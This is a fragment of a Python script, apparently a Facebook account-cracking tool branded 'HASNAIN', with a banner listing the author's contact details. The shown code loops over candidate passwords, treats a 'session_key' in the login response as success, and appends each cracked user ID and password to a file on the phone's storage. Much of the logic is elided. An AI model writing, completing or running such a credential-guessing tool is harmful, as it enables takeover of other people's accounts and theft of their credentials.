...
def logo():
    ...
    print(f"""{white}
      ...
      .HASNAIN""")                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : HASNAIN")
    print(f" {white}{green}[~]{white} Facebook  : HASNAIN")
    print(f" {white}{green}[~]{white} Fucked By : HASNAIN")
    print(f" {white}{green}[~]{white} Tool      : HASNAIN  ")
    print(f" {white}{green}[~]{white} Github    :  HASNAIN")
    print(f" {white}{green}[~]{white} Whatsapp  : 03248233751 Only private ")
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[HASNAIN-OK] {uid} | {pw} {white}')
                    open('/sdcard/HASNAIN-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
